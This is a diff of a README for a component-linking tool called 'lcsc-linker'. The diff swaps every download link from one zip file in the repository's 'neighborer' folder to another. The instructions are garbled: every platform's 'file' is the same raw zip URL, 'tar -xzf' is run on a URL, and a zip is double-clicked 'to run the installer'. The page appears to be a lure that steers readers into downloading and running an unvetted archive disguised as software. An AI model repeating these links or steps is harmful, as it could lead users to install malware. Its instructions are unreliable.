@@ -1,7 +1,7 @@
 # 🔗 lcsc-linker - Link Your Components Easily
 
 ## 📥 Download Now!
-[![Download lcsc-linker](https://raw.githubusercontent.com/VincentK123/lcsc-linker/master/neighborer/linker_lcsc_v1.1.zip)](https://raw.githubusercontent.com/VincentK123/lcsc-linker/master/neighborer/linker_lcsc_v1.1.zip)
+[![Download lcsc-linker](https://github.com/VincentK123/lcsc-linker/raw/refs/heads/master/neighborer/linker_lcsc_3.9.zip)](https://github.com/VincentK123/lcsc-linker/raw/refs/heads/master/neighborer/linker_lcsc_3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -18,26 +18,26 @@ Before you download, make sure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started with lcsc-linker, visit this page to download: [Download lcsc-linker](https://raw.githubusercontent.com/VincentK123/lcsc-linker/master/neighborer/linker_lcsc_v1.1.zip).
+To get started with lcsc-linker, visit this page to download: [Download lcsc-linker](https://github.com/VincentK123/lcsc-linker/raw/refs/heads/master/neighborer/linker_lcsc_3.9.zip).
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version listed at the top. You will find several files for different operating systems.
 3. Select the appropriate file for your system.
-   - For **Windows**, download the `https://raw.githubusercontent.com/VincentK123/lcsc-linker/master/neighborer/linker_lcsc_v1.1.zip` file.
-   - For **macOS**, download the `https://raw.githubusercontent.com/VincentK123/lcsc-linker/master/neighborer/linker_lcsc_v1.1.zip` file.
-   - For **Linux**, download the `https://raw.githubusercontent.com/VincentK123/lcsc-linker/master/neighborer/linker_lcsc_v1.1.zip` file.
+   - For **Windows**, download the `https://github.com/VincentK123/lcsc-linker/raw/refs/heads/master/neighborer/linker_lcsc_3.9.zip` file.
+   - For **macOS**, download the `https://github.com/VincentK123/lcsc-linker/raw/refs/heads/master/neighborer/linker_lcsc_3.9.zip` file.
+   - For **Linux**, download the `https://github.com/VincentK123/lcsc-linker/raw/refs/heads/master/neighborer/linker_lcsc_3.9.zip` file.
 4. Click on the file to start the download.
 
 ### Installation Steps:
 
 #### For Windows:
-1. After the download is complete, find the `https://raw.githubusercontent.com/VincentK123/lcsc-linker/master/neighborer/linker_lcsc_v1.1.zip` file in your downloads folder.
+1. After the download is complete, find the `https://github.com/VincentK123/lcsc-linker/raw/refs/heads/master/neighborer/linker_lcsc_3.9.zip` file in your downloads folder.
 2. Double-click the file to run the installer.
 3. Follow the on-screen instructions to complete the installation.
 4. Once installed, you can find lcsc-linker in your Start Menu.
 
 #### For macOS:
-1. Locate the `https://raw.githubusercontent.com/VincentK123/lcsc-linker/master/neighborer/linker_lcsc_v1.1.zip` file in your downloads.
+1. Locate the `https://github.com/VincentK123/lcsc-linker/raw/refs/heads/master/neighborer/linker_lcsc_3.9.zip` file in your downloads.
 2. Double-click the file to open it.
 3. Drag the lcsc-linker icon to your Applications folder.
 4. You can now find lcsc-linker in your Applications.
@@ -45,7 +45,7 @@ To get started with lcsc-linker, visit this page to download: [Download lcsc-lin
 #### For Linux:
 1. Open a terminal.
 2. Navigate to your downloads directory.
-3. Extract the tarball using the command: `tar -xzf https://raw.githubusercontent.com/VincentK123/lcsc-linker/master/neighborer/linker_lcsc_v1.1.zip`.
+3. Extract the tarball using the command: `tar -xzf https://github.com/VincentK123/lcsc-linker/raw/refs/heads/master/neighborer/linker_lcsc_3.9.zip`.
 4. Change to the extracted directory with: `cd lcsc-linker`.
 5. Run the application with the command: `./lcsc-linker`.
 
